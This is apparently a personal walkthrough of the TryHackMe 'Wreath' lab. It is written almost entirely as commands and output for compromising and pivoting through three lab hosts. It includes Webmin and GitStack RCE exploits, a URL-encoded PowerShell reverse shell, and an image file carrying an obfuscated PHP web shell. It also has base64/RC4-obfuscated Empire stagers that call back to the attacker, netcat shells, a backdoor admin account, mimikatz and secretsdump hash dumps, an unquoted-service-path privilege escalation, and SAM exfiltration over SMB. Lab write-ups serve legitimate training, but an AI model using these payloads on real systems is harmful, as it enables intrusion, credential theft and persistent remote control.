+++
title = "Wreath"
+++

# https://tryhackme.com/room/wreath

```bash
=================================
10.200.180.200 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.200.180.200' >> ~/.zshrc && source ~/.zshrc

sudo rustscan --no-banner -u $(ulimit -Hn) -b 65535 -t 2000 --scan-order "Random" -r 1-65535 -a $TARGET -- -oA $(date +%Y-%m-%d_%H%M)_rustscan -A
PORT      STATE    SERVICE          REASON         VERSION
22/tcp    open     ssh              syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
80/tcp    filtered http             no-response
443/tcp   filtered https            no-response
10000/tcp filtered snet-sensor-mgmt no-response

sudo nmap -Pn -sA -p 80,443,10000 -sC -sV thomaswreath.thm
PORT      STATE      SERVICE          VERSION
80/tcp    unfiltered http
443/tcp   unfiltered https
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2025-10-06T19:30:20
|_Not valid after:  2026-10-06T19:30:20
| tls-alpn:
|_  http/1.1
10000/tcp unfiltered snet-sensor-mgmt
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on prod-serv
| Not valid before: 2020-11-07T22:27:10
|_Not valid after:  2025-11-06T22:27:10

curl -I http://$TARGET
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c
Location: https://thomaswreath.thm
Content-Type: text/html; charset=iso-8859-1

echo "$TARGET thomaswreath.thm" | sudo tee -a /etc/hosts
sudo service NetworkManager restart
ping -c1 10.200.180.200  # target up
ping -c1 thomaswreath.thm  # DNS config working
ping -i 5 -W 10 $TARGET  # heartbeat for bad connections

---

CVE-2019-15107
https://www.exploit-db.com/exploits/47230
mkdir -p ~/.msf4/modules/exploits/multi/http/ ; curl -sL https://www.exploit-db.com/raw/47230 -o ~/.msf4/modules/exploits/multi/http/cve_2019_15107_webmin_rce.rb
reload_all
search cve_2019_15107_webmin_rce

use exploit/multi/http/cve_2019_15107_webmin_rce
setg RHOSTS thomaswreath.thm
setg VHOST thomaswreath.thm
set SSL true
setg SSLVerifyMode none
setg LHOST 10.250.180.3
setg LPORT 54321
show options
run
// didnt work?

git clone https://github.com/MuirlandOracle/CVE-2019-15107
cd CVE-2019-15107 && pip3 install --break-system -r requirements.txt
./CVE-2019-15107.py $TARGET
shell
10.250.180.3
54321
nc -lvnp 54321

for i in python3 python python2; do command -v "$i" >/dev/null && "$i" -c 'import pty; pty.spawn("/bin/bash")' && exit; done
export TERM=xterm
CTRL+Z
stty raw -echo; fg

cat /etc/shadow
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::

cat /root/.ssh/id_rsa
chmod 600 target_id_rsa

sudo apt install -y autossh
autossh -M 0 -o "ServerAliveInterval 15" -o "ServerAliveCountMax 3" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 -i target_id_rsa root@$TARGET

### access ephemeral attack VM
### vagrant vm
ssh-keygen -t rsa -b 4096 -f ~/.ssh/target_key -N "" && cat ~/.ssh/target_key.pub
### target
mkdir -p <USER>/.ssh
touch <USER>/.ssh/authorized_keys
chmod 700 <USER>/.ssh
chmod 600 <USER>/.ssh/authorized_keys
#command="echo 'Port forwarding only'",no-agent-forwarding,no-x11-forwarding,no-pty
cat # << EOF >> <USER>/.ssh/authorized_keys
# PASTE YOUR PUBLIC KEY STRING HERE, THEN TYPE EOF
###
ssh -o UserKnownHostsFile=/dev/null -i ~/.ssh/target_key <USER>@<IP>
snap install --classic zellij

---

### PROXIES
https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/
https://chromewebstore.google.com/detail/foxyproxy-basic/dookpfaalaaappcdneeahomimbllocnb

ssh -NfD 9050
ssh -NfL <LOCAL_PORT>:<TARGET>:<TARGET_PORT>

# sometimes nmap crashes with proxy_dns
echo -e "#proxy_dns\n[ProxyList]\nsocks5 127.0.0.1 <PORT>" | sudo tee -a /etc/proxychains.conf
# very slow ; ideally use LoL tools first for live host discovery
sudo nmap -n -Pn -sT -sC -sV <TARGET>

---

scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  -i target_id_rsa static-binaries/binaries/linux/x86_64/nmap root@10.200.180.200:/tmp/
cd /tmp
chmod +x nmap
./nmap -n -sn -oA live_hosts 10.200.180.0/24
grep 'Status: Up' *.gnmap | awk '{print $2}' > live_hosts.txt
# nmap -sC -sV -O will not work without /usr/share/nmap
./nmap -n -Pn -iL live_hosts.txt
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

sudo proxychains nmap -n -Pn -sC -sV -O -p 80,3389,5985 -sT --reason 10.200.180.150
PORT     STATE SERVICE       REASON  VERSION
80/tcp   open  http          syn-ack Apache httpd 2.2.22 ((Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3)
|_http-server-header: Apache/2.2.22 (Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3
|_http-title: Page not found at /
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GIT-SERV
|   NetBIOS_Domain_Name: GIT-SERV
|   NetBIOS_Computer_Name: GIT-SERV
|   DNS_Domain_Name: git-serv
|   DNS_Computer_Name: git-serv
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-07T20:08:27+00:00
| ssl-cert: Subject: commonName=git-serv
| Not valid before: 2025-10-05T19:29:43
|_Not valid after:  2026-04-06T19:29:43
|_ssl-date: 2025-10-07T20:08:30+00:00; 0s from scanner time.
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

use auxiliary/scanner/http/dir_scanner
setg RHOSTS 10.200.180.150
setg Proxies socks5:127.0.0.1:9050
show options
run
[+] Found http://10.200.180.150:80/cgi-bin/ 404 (10.200.180.150)
[+] Found http://10.200.180.150:80/static/ 404 (10.200.180.150)
[+] Found http://10.200.180.150:80/web/ 200 (10.200.180.150)
[+] Found http://10.200.180.150:80/website/ 404 (10.200.180.150)

curl -x socks4://127.0.0.1:9050 -o- 10.200.180.150
// Django
//    ^registration/login/$
//    ^gitstack/
//    ^rest/

curl -x socks4://127.0.0.1:9050 -L -o- 10.200.180.150/web
// git php

search gitstack
use windows/http/gitstack_rce
set LHOST 10.200.180.200
set LPORT 8080 
set ReverseAllowProxy true
show options
// [-] Exploit aborted due to failure: payload-failed: Payload exceeds space left in exec call

wget https://www.exploit-db.com/raw/43777 -O gitstack_exploit.py
chmod +x gitstack_exploit.py
sed -i 's/\r//' gitstack_exploit.py
## !!! Edit IP !!!
## !!! change all exploit.php to exploit-apple.php !!!
python2 gitstack_exploit.py

curl -L -o- -X POST '10.200.180.150/web/exploit-apple.php' -H 'Content-Type: application/x-www-form-urlencoded' -d 'a=whoami'
// nt authority\system

curl -L -o- -X POST '10.200.180.150/web/exploit-apple.php' -H 'Content-Type: application/x-www-form-urlencoded' -d 'a=hostname'
// git-serv

curl -L -o- -X POST '10.200.180.150/web/exploit-apple.php' -H 'Content-Type: application/x-www-form-urlencoded' -d 'a=ver'
// Microsoft Windows [Version 10.0.17763.1637]

curl -L -o- -X POST '10.200.180.150/web/exploit-apple.php' -H 'Content-Type: application/x-www-form-urlencoded' -d 'a=ping -n 1 10.200.180.200'
// Reply from 10.200.180.200: bytes=32 time<1ms TTL=64

curl -L -o- -X POST '10.200.180.150/web/exploit-apple.php' -H 'Content-Type: application/x-www-form-urlencoded' -d 'a=ping -n 1 10.200.180.3'
// Reply from 10.200.180.150: Destination host unreachable.

curl -x socks5://127.0.0.1:9050 -L -o- -X POST '10.200.180.150/web/exploit-apple.php' -H 'Content-Type: application/x-www-form-urlencoded' -d 'a=powershell -Command "Test-NetConnection -ComputerName 10.200.180.200 -Port 61337"'

scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  -i target_id_rsa static-binaries/binaries/linux/x86_64/socat root@10.200.180.200:/dev/shm/pineapple
# this *could* work but the nmap data dirs need to match versions

autossh -M 0 -o "ServerAliveInterval 15" -o "ServerAliveCountMax 3" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 -D 9050 -i ~/target_id_rsa root@$TARGET
#-R 0.0.0.0:61337:127.0.0.1:61337
### Open up firewall port 61337
firewall-cmd --zone=public --add-port 61337/tcp
firewall-cmd --list-all
nohup ./pineapple tcp-l:61337,fork,reuseaddr tcp:10.250.180.3:61337 2>&1 1>/dev/null &
/dev/shm/pineapple -ddd tcp-l:61337,fork,reuseaddr tcp:10.250.180.3:61337

watch -n.5 'netstat -antup | grep 61337'
curl -x socks5://127.0.0.1:9050 -L -o- -X POST '10.200.180.150/web/exploit-apple.php' -H 'Content-Type: application/x-www-form-urlencoded' -d 'a=powershell -Command "Test-NetConnection -ComputerName 10.200.180.200 -Port 61337"'

nc -nvlp 61337
# needs to hit pivot: 10.200.180.200:61337
# URL encoded: https://www.urlencoder.org/
curl -x socks5://127.0.0.1:9050 -L -o- -X POST '10.200.180.150/web/exploit-apple.php' -H 'Content-Type: application/x-www-form-urlencoded' -d 'a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.180.200%27%2C61337%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22'
// success!

# avoid passwords >14 chars
cmd /c "net user tacoman TacoMan2025! /add"
cmd /c "net localgroup administrators tacoman /add"
cmd /c 'net localgroup "Remote Management Users" tacoman /add'
cmd /c "net user tacoman"

sudo apt install -y sshuttle
sudo nohup sshuttle -r root@$TARGET --ssh-cmd "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /home/vagrant/target_id_rsa" -x 10.200.180.200 -v 10.200.180.0/24 2>&1 >/dev/null &
# sudo nmap -n -Pn -sT -p80,3389,5958 10.200.180.150

# evil-winrm usually gives medium integrity shells for added administrator accounts
evil-winrm -i 10.200.180.150 -u tacoman -p 'TacoMan2025!'

sudo xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /drive:'/usr/share/windows-resources/mimikatz/x64',share /v:10.200.180.150 /u:tacoman /p:'TacoMan2025!'

# RUN cmd.exe as Administrator
\\tsclient\share\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
Domain : GIT-SERV
SysKey : 0841f6354f4b96d21b99345d07b66571
Local SID : S-1-5-21-3335744492-1614955177-2693036043
SAMKey : f4a3c96f8149df966517ec3554632cf4
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 68b1608793104cca229de9f1dfb6fbae
* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-1696O63F791Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8f7590c29ffc78998884823b1abbc05e6102a6e86a3ada9040e4f3dcb1a02955
      aes128_hmac       (4096) : 503dd1f25a0baa75791854a6cfbcd402
      des_cbc_md5       (4096) : e3915234101c6b75
* Packages *
    NTLM-Strong-NTOWF
* Primary:Kerberos *
    Default Salt : WIN-1696O63F791Administrator
    Credentials
      des_cbc_md5       : e3915234101c6b75
RID  : 000001f5 (501)
User : Guest
RID  : 000001f7 (503)
User : DefaultAccount
RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: c70854ba88fb4a9c56111facebdf3c36
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e389f51da73551518c3c2096c0720233
* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1d916df8ca449782c73dbaeaa060e0785364cf17c18c7ff6c739ceb1d7fdf899
      aes128_hmac       (4096) : 33ee2dbd44efec4add81815442085ffb
      des_cbc_md5       (4096) : b6f1bac2346d9e2c
* Packages *
    NTLM-Strong-NTOWF
* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : b6f1bac2346d9e2c
RID  : 000003e9 (1001)
User : Thomas
  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 03126107c740a83797806c207553cef7
* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVThomas
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 19e69e20a0be21ca1befdc0556b97733c6ac74292ab3be93515786d679de97fe
      aes128_hmac       (4096) : 1fa6575936e4baef3b69cd52ba16cc69
      des_cbc_md5       (4096) : e5add55e76751fbc
    OldCredentials
      aes256_hmac       (4096) : 9310bacdfd5d7d5a066adbb4b39bc8ad59134c3b6160d8cd0f6e89bec71d05d2
      aes128_hmac       (4096) : 959e87d2ba63409b31693e8c6d34eb55
      des_cbc_md5       (4096) : 7f16a47cef890b3b
* Packages *
    NTLM-Strong-NTOWF
* Primary:Kerberos *
    Default Salt : GIT-SERVThomas
    Credentials
      des_cbc_md5       : e5add55e76751fbc
    OldCredentials
      des_cbc_md5       : 7f16a47cef890b3b
RID  : 000003ea (1002)
User : tacoman
  Hash NTLM: daa003b6b9e03399c33482fb18104ff1
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b32c7d1ca9cf3cdb367f5dd7227b9d76
* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVtacoman
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 2c98445c812c9d8e4a5599bb55edfbbe0630aef6c8da1c1b6ed2ce4d56359351
      aes128_hmac       (4096) : 139e990340b6d753033c2f65bd536f31
      des_cbc_md5       (4096) : c7fdf2b9cb437fe6
* Packages *
    NTLM-Strong-NTOWF
* Primary:Kerberos *
    Default Salt : GIT-SERVtacoman
    Credentials
      des_cbc_md5       : c7fdf2b9cb437fe6

// CREDS!
twreath:i<3ruby

evil-winrm -i 10.200.180.150 -u Administrator -H '37db630168e5f82aafa8461e05c6bbd1'

---

### EMPIRE
# NOTE: cannot be proxied via socats

# Setup
sudo apt install powershell-empire starkiller
sudo powershell-empire server
http://localhost:1337/
//    Username: empireadmin
//    Password: password123

# Listeners (attack box or infrastructure)
# http://localhost:1337/#/listeners
- Type: http
- Host: http://<IP of Attack Box (tun0)>
- Port: 8000

# Stagers (RAT downloader)
# http://localhost:1337/#/stagers
- Type: linux_bash
- Listener: <LISTENER that it will connect to>
- Language: Python
# outputs code/script to run stager to download RAT

# Agents (instance on target)
# http://localhost:1337/#/agents
# http://localhost:1337/#/agent-tasks
<After stager succeeds, these are instances>

### Agent on 10.200.180.200 (centos) ==> 10.250.180.3 (kali)
#!/bin/bash
echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5czsKaW1wb3J0IHJlLCBzdWJwcm9jZXNzOwpjbWQgPSAicHMgLWVmIHwgZ3JlcCBMaXR0bGVcIFNuaXRjaCB8IGdyZXAgLXYgZ3JlcCIKcHMgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkKb3V0LCBlcnIgPSBwcy5jb21tdW5pY2F0ZSgpOwppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKTsKCmltcG9ydCB1cmxsaWIucmVxdWVzdDsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMC4yNTAuMTgwLjM6ODAwMCc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJzsKcmVxPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3Qoc2VydmVyK3QpOwpwcm94eSA9IHVybGxpYi5yZXF1ZXN0LlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliLnJlcXVlc3QuYnVpbGRfb3BlbmVyKHByb3h5KTsKby5hZGRoZWFkZXJzPVsoJ1VzZXItQWdlbnQnLFVBKSwgKCJDb29raWUiLCAic2Vzc2lvbj1ITEJtQmRLSzZFR0ROK01BOUVxN3JMTjJjdWM9IildOwp1cmxsaWIucmVxdWVzdC5pbnN0YWxsX29wZW5lcihvKTsKYT11cmxsaWIucmVxdWVzdC51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07CmRhdGE9YVs0Ol07CmtleT1JVisnc3FzU2IyVnluTzhqdUs2TlVYUm5KenhRN3FLSllsVFYnLmVuY29kZSgnVVRGLTgnKTsKUyxqLG91dD1saXN0KHJhbmdlKDI1NikpLDAsW107CmZvciBpIGluIGxpc3QocmFuZ2UoMjU2KSk6CiAgICBqPShqK1NbaV0ra2V5W2klbGVuKGtleSldKSUyNTY7CiAgICBTW2ldLFNbal09U1tqXSxTW2ldOwppPWo9MDsKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2OwogICAgaj0oaitTW2ldKSUyNTY7CiAgICBTW2ldLFNbal09U1tqXSxTW2ldOwogICAgb3V0LmFwcGVuZChjaHIoY2hhcl5TWyhTW2ldK1Nbal0pJTI1Nl0pKTsKZXhlYygnJy5qb2luKG91dCkpOw=='));" | python3 &
#rm -f "$0"  # removed
exit

# Hop Listener (intermediary)
# localhost:1337/#/listeners/
- Type: http_hop
- Host: <IP of redir Target>
- Port: 61137
- RedirectListener: <Other Listener>
- OutFolder: X (these are PHP needed to be uploaded to target)

# Hop Stager
- Type: windows_launcher_bat
- Listener: http_hop

### on centos .200
firewall-cmd --zone=public --add-port 61337/tcp
firewall-cmd --list-all
mkdir -p /dev/shm/mango
zip -r mango.zip mango/
sudo python3 -m http.server 80
#sudo scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /home/vagrant/target_id_rsa -r /tmp/mango root@10.200.180.200:/tmp
curl 10.250.180.3/mango.zip && unzip mango.zip
ls -la /dev/shm/mango
cd /dev/shm/mango
nohup bash -c 'SERVER_ARGS="-S 0.0.0.0:61337"; exec -a mango php $SERVER_ARGS' 2>&1 1>/dev/null &
# ^ this is for the http_hop (redir)

### on git server
If($PSVersionTable.PSVersion.Major -ge 3){};[System.Net.ServicePointManager]::Expect100Continue=0;$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('sqsSb2VynO8juK6NUXRnJzxQ7qKJYlTV');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add("Cookie","session=0jBe5W6kPN9J3ozteQpJF5YIzgs=");$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADAALgAyADAAMAAuADEAOAAwAC4AMgAwADAAOgA2ADEAMwAzADcA')));$t='/admin/get.php';$hop='http_hop';$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX

---

# tasty powershell postexp scripts
# /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network

evil-winrm -i 10.200.180.150 -u Administrator -H '37db630168e5f82aafa8461e05c6bbd1' -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
Invoke-Portscan -Hosts 10.200.180.100 -TopPorts 50
// Hostname      : 10.200.180.100
// alive         : True
// openPorts     : {80, 3389}
// closedPorts   : {}
// filteredPorts : {445, 443, 21, 23...}

# NOTE: sshuttle already running to route to there
netsh advfirewall firewall add rule name="PINEAPPLE" dir=in action=allow protocol=tcp localport=61337
sudo apt install chisel
wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_windows_386.zip && unzip chisel_1.11.3_windows_386.zip
# copied chisel via RDP shares mapping
.\orange.exe server -p 61337
chisel client 10.200.180.150:61337 8888:10.200.180.100:80

whatweb --aggression 3 http://localhost:8888
http://localhost:8888 [200 OK] Apache[2.4.46], Bootstrap[3.3.6], Email[,me@thomaswreath.thm], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11], IP[::1], JQuery[2.1.4], OpenSSL[1.1.1g], PHP[7.4.11], Script, Title[Thomas Wreath | Developer], X-UA-Compatible[IE=edge]

cd C:\Gitstack\repositories
download Website.git
mv Website.git .git
git clone https://github.com/internetwache/GitTools
~/GitTools/Extractor/extractor.sh . Website
separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
cd 0-345ac8b236064b431fa43f53d91c98c4834ef8f3
find . -name "*.php"

# browse chisel tunnel:
# http://localhost:8888/resources/
Thomas:i<3ruby

# downloaded cat pic as banana1.jpg.php
# Obfuscated PHP code
exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" banana1.jpg.php
exiftool info banana1.jpg.php

curl -o- --user 'Thomas:i<3ruby' http://127.0.0.1:8888/resources/uploads/banana1.jpg.php?wreath=systeminfo
curl -o- --user 'Thomas:i<3ruby' http://127.0.0.1:8888/resources/uploads/banana1.jpg.php?wreath=whoami

curl -o- --user 'Thomas:i<3ruby' 'http://127.0.0.1:8888/resources/uploads/banana1.jpg.php?wreath=ping%20-n%201%2010.250.180.3'
�<pre>
Pinging 10.250.180.3 with 32 bytes of data:
Reply from 10.250.180.3: bytes=32 time=193ms TTL=63
// callback directly to kali no problem!

git clone https://github.com/int0x33/nc.exe/
cp ./nc.exe/nc64.exe banana.exe

sudo python3 -m http.server 80
# Windows Command: dir %TEMP%
curl -o- --user 'Thomas:i<3ruby' 'http://127.0.0.1:8888/resources/uploads/banana1.jpg.php?wreath=dir%20%25TEMP%25'
# Windows Command: curl http://10.250.180.3/banana.exe -o %TEMP%\nc-banana.exe
curl -o- --user 'Thomas:i<3ruby' 'http://127.0.0.1:8888/resources/uploads/banana1.jpg.php?wreath=curl%20http%3A%2F%2F10.250.180.3%2Fbanana.exe%20-o%20%25TEMP%25%5Cnc-banana.exe'

# Interactive
nc -lnvp 54321
curl -o- --user 'Thomas:i<3ruby' 'http://127.0.0.1:8888/resources/uploads/banana1.jpg.php?wreath=%25TEMP%25%5Cnc-banana.exe%2010.250.180.3%2054321%20-e%20cmd.exe'
// success!

whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288

wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
// see SystemExplorerHelpService doesnt have quotes around the name

sc qc SystemExplorerHelpService
SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
Owner  : BUILTIN\Administrators
Group  : WREATH-PC\None
Access : BUILTIN\Users Allow  FullControl
...
// FULL WRITE TO HERE^^^

sudo apt install -y mono-devel
vim Wrapper.cs
using System;
using System.Diagnostics;
namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("C:\\Users\\Thomas\\AppData\\Local\\Temp\\nc-banana.exe", "10.250.180.3 61337 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
mcs Wrapper.cs
// outputs Wrapper.exe

sudo git clone https://github.com/SecureAuthCorp/impacket /opt/impacket && cd /opt/impacket

sudo python3 -m venv venv
sudo su
pip3 install .

cd /home/vagrant/
sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username tacoman -password 'abc123!!!'

net use \\10.250.180.3\share /USER:tacoman "abc123!!!"
copy \\10.250.180.3\share\Wrapper.exe %TEMP%\wrapper-banana.exe
dir %TEMP%
net use \\10.250.180.3\share /del

---

nc -lnvp 61337
wrapper-banana.exe
// AV not catching it!

dir "C:\Program Files (x86)\System Explorer"
copy "%TEMP%\wrapper-banana.exe" "C:\Program Files (x86)\System Explorer\System.exe"
sc stop SystemExplorerHelpService
sc start SystemExplorerHelpService
sc qc SystemExplorerHelpService
// system!
whoami
// nt authority\system

# cleanup
del "C:\Program Files (x86)\System Explorer\System.exe"
# https://github.com/mattymcfatty/unquotedPoC
# https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/

# EXFIL >:D
# system
reg.exe save HKLM\SAM C:\Users\Thomas\AppData\Local\Temp\sam.bak
reg.exe save HKLM\SYSTEM C:\Users\Thomas\AppData\Local\Temp\system.bak
icacls sam.bak /grant Users:F
icacls system.bak /grant Users:F
# thomas user
net use \\10.250.180.3\share /USER:tacoman "abc123!!!"
move C:\Users\Thomas\AppData\Local\Temp\sam.bak \\10.250.180.3\share\sam.bak
move C:\Users\Thomas\AppData\Local\Temp\system.bak \\10.250.180.3\share\system.bak
net use \\10.250.180.3\share /del

python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::


```